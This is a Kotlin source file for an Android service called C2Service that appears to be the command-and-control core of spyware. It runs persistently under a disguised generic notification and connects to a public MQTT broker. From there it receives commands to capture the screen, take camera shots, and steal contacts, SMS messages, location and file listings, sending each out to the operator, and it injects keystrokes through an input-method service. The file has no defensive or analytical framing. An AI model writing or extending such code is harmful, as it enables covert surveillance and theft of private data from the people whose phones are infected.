package com.t.core
import android.app.*
import android.content.Intent
import android.os.*
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
class C2Service : Service() {
    companion object {
        var inst: C2Service? = null
        fun notif(c: android.content.Context): Notification {
            VC.notifChannel(c, "s", "服务")
            val b = if (Build.VERSION.SDK_INT >= 26) Notification.Builder(c, "s") else @Suppress("DEPRECATION") Notification.Builder(c)
            return b.setSmallIcon(android.R.drawable.stat_sys_download_done).setContentTitle("服务").build()
        }
    }
    private var mqtt: MqttAsyncClient? = null
    private var deviceId = "未知"
    val TOPIC_PREFIX = "dsx_secret_2026" 
    
    override fun onCreate() {
        super.onCreate(); inst = this
        VC.fgType(this, 1, notif(this))
        runCatching { VC.startFg(this, Intent(this, GuardService::class.java)) }
        val id = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "0000"
        deviceId = "${Build.BRAND}-${Build.MODEL}-${id.takeLast(4)}"
        connect()
    }
    private fun connect() {
        try {
            mqtt = MqttAsyncClient("tcp://broker.emqx.io:1883", MqttClient.generateClientId(), MemoryPersistence())
            mqtt?.setCallback(object : MqttCallback {
                override fun connectionLost(cause: Throwable?) { Handler(Looper.getMainLooper()).postDelayed({ connect() }, 5000) }
                override fun messageArrived(topic: String?, message: MqttMessage?) { dispatch(message?.payload?.toString(Charsets.UTF_8) ?: "") }
                override fun deliveryComplete(token: IMqttDeliveryToken?) {}
            })
            val opt = MqttConnectOptions().apply { isAutomaticReconnect = true; isCleanSession = true }
            mqtt?.connect(opt, null, object : IMqttActionListener {
                override fun onSuccess(t: IMqttToken?) {
                    mqtt?.subscribe("$TOPIC_PREFIX/cmd/$deviceId", 0)
                    mqtt?.publish("$TOPIC_PREFIX/online", MqttMessage(deviceId.toByteArray()))
                }
                override fun onFailure(t: IMqttToken?, e: Throwable?) {}
            })
        } catch (e: Exception) {}
    }
    fun sendBinary(jpeg: ByteArray) { runCatching { mqtt?.publish("$TOPIC_PREFIX/img/$deviceId", MqttMessage(jpeg).apply { qos = 0 }) } }
    fun sendMsg(msg: String) { runCatching { mqtt?.publish("$TOPIC_PREFIX/msg/$deviceId", MqttMessage(msg.toByteArray()).apply { qos = 0 }) } }
    
    private fun dispatch(c: String) {
        val a = c.split(" ", limit = 2); val arg = a.getOrNull(1) ?: ""
        when (a[0]) {
            "screen" -> runCatching { startActivity(Intent(this, CaptureActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) }
            "stopcap" -> ScreenMgr.stop()
            "contacts" -> DataGrab.contacts(this) { sendMsg(it) }
            "sms" -> DataGrab.sms(this) { sendMsg(it) }
            "loc" -> DataGrab.loc(this) { sendMsg(it) }
            "camera" -> DataGrab.shoot(this, arg) { sendMsg(it) }
            "files" -> DataGrab.list(this, arg) { sendMsg(it) }
            "type" -> ImeService.commit(arg)
        }
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int { if (mqtt?.isConnected == false) connect(); return START_STICKY }
    override fun onDestroy() { inst = null; runCatching { VC.startFg(this, Intent(this, this::class.java)) } }
    override fun onBind(i: Intent?): IBinder? = null
}
